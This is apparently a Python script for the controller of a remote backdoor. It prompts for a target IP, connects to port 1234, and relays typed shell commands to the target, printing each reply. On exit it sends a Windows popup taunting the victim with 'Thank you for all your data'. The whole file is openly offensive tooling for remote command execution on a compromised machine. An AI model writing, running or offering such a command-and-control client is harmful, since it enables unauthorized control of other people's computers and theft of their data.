import socket
import time
###################################################
###################MADE BY LOTEM###################
###################################################
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
recvrm = 2048
STRByte = "utf-8"
IP = str(input('the target IP address'))


def main():
    s.connect((IP, 1234))
    while True:
        usercommand = input("$ ")
        if usercommand == "EXIT":
            s.send(bytes('msg * Thank you for all your data.I how you have nice day :)', STRByte))
            break
        s.send(bytes(usercommand, STRByte))
        msg = s.recv(recvrm)
        data = msg.decode(STRByte)
        print(data)
        time.sleep(0.5)
if __name__ == "__main__":
    main()